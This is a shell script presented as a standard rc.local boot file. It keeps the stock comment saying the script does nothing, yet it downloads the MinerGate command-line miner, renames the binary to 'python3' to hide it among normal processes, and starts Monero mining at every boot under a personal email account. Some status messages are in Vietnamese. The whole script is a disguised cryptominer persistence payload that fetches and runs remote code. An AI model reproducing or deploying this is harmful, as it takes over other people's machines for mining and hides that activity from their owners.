#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/minergate-cli/python3 ]; then
    if pgrep -x "python3" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
cd minergate-cli
./python3 -u haidang.ild@gmail.com --xmr 2

     
fi
exit
fi

wget https://download.minergate.com/xfast-ubuntu-cli
unzip xfast-ubuntu-cli
cd minergate-cli
mv minergate-cli python3
./python3 -u haidang.ild@gmail.com --xmr 2
